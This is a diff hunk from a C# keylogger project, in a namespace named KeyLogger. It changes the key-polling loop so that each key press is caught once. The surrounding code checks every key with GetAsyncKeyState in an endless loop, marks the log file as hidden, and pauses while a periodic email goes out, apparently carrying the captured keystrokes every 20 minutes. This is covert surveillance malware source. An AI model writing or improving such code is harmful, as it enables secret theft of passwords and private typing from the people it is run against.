@@ -146,13 +146,12 @@ namespace KeyLogger
             t.AutoReset = true;              // every 20 minutes
             t.Enabled = true;
 
-            int key = 0; // Used to store the user pressed key
-
             while (true)
             {
                 for (int i = 0; i < 255; i++)
                 {
-                    if ((key = GetAsyncKeyState(i)) != 0) // Checks if user pressed a key
+                    int key = GetAsyncKeyState(i); // Used to store the user pressed key
+                    if (key == 1 || key == -32767) // Checks if user pressed a key
                     {
                         while (elapsed) { } // Halts the loop while the email is sent
                         File.SetAttributes(path, FileAttributes.Hidden); // Writes the newly pressed
